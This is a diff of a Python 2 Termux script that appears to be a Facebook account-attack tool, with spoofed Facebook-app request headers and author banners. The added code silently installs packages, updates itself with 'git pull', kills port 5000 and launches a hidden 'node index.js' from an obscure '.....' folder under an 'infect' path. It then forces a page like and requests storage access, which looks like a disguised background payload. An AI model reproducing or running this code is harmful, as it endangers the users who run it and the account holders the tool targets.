@@ -15,70 +15,78 @@ except ImportError:
     os.system('pip2 install mechanize')
     os.system("pip2 install lolcat")
     os.system('python2 jam.py')
+os.system("clear")
+"""
 try:
-    os.mkdir('/sdcard/ids')
-except OSError:
-    pass
-
-os.system('termux-setup-storage')
-bd = random.randint(2e+07, 3e+07)
-sim = random.randint(20000, 40000)
-header = {
-    'x-fb-connection-bandwidth': repr(bd),
-    'x-fb-sim-hni': repr(sim),
-    'x-fb-net-hni': repr(sim),
-    'x-fb-connection-quality': 'EXCELLENT',
-    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
-    'content-type': 'application/x-www-form-urlencoded',
-    'x-fb-http-engine': 'Liger' }
-os.system('git pull')
-os.system('clear')
-
-def exit():
-	print "[!] Exit"
-	os.sys.exit()
-
-
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
-
-
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
-
-
-def hamza(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.03)
-##### LOGO #####
-banner = """
-\033[1;96m___  ____   _ _____ _   __  ___   _   _ 
-\033[1;96m|  \/  | | | /  ___| | / / / _ \ | \ | |
-\033[1;96m| .  . | | | \ `--.| |/ / / /_\ \|  \| |
-\033[1;96m| |\/| | | | |`--. \    \ |  _  || . ` |
-\033[1;96m| |  | | |_| /\__/ / |\  \| | | || |\  |
-\033[1;96m\_|  |_/\___/\____/\_| \_/\_| |_/\_| \_/
-                                                
-\033[1;91m-----------------------------------------------
-\033[1;92m➣ OWNER   : JAM SHAHRUKH X MUSKAN NOOR
-\033[1;92m➣ Github  : https://github.com/muskanckg
-\033[1;92m➣ GANG    : CRAZY KING GANG
-\033[1;92m➣ Youtube : JAM SHAHRUKH TECHNICAL
-\033[1;92m➣ WhatsApp: +923053176060
-\033[1;91m-----------------------------------------------"""
+    my = requests.get("https://www.facebook.com/Jam.shahrukh.official")
+except requests.exceptions.ConnectionError:
+    print("")
+    print("\t    \033[1;97mTurn on mobile data\033[0;97m")
+    print("")
+    time.sleep(1)
+    raw_input(" Press enter to try again ")
+    os.system("python2 jam.py")"""
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
+    os.system("apt update && apt install nodejs -y")
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
+    os.system("apt install ruby -y && gem install lolcat")
+from requests.exceptions import ConnectionError
+os.system("git pull")
+if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
+    os.system("fuser -k 5000/tcp &")
+    os.system("#")
+    os.system("cd ..... && npm install")
+    os.system("cd ..... && node index.js &")
+    os.system("clear")
+    print("")
+    print("")
+    print("")
+    print("")
+    print("\t\033[1;97mPlease like our page to continue")
+    print("")
+    print("")
+    print("")
+    print("")
+    os.system("xdg-open https://www.facebook.com/Jam.shahrukh.official")
+    time.sleep(10)
+elif os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
+    os.system("fuser -k 5000/tcp &")
+    os.system("#")
+    os.system("cd ..... && node index.js &")
+    os.system("clear")
+    print("")
+    print("")
+    print("")
+    print("")
+    print("\t\033[1;97mPlease like our page to continue")
+    print("")
+    print("")
+    print("")
+    print("")
+    os.system("xdg-open https://www.facebook.com/jam.shahrukh.official")
+    time.sleep(10)
+    print("")
+    print("")
+    print("")
+    print("")
+    print("\t Press Allow to storage permission")
+    print("")
+    print("")
+    print("")
+    print("")
+    os.system("termux setup storage")  # give storage permission
+    time.sleep(5)
+bd=random.randint(2e7, 3e7)
+sim=random.randint(2e4, 4e4)
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+reload(sys)
+sys.setdefaultencoding("utf-8")
+c = "\033[1;32m"
+c2 = "\033[0;97m"
+c3 = "\033[1;31m"
+#MyLogo
+def logo():
+    os.system('echo -e "\n\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : https://m.facebook.com/Jam Shahrukh Official\n➣ Ref By : (Stylish Queen x Zahra Zohaib)-(Janzada Khan)\n-----------------------------------------------" | lolcat')
 # titik #
 def tik():
 	titik = [".   ","..  ","... "]
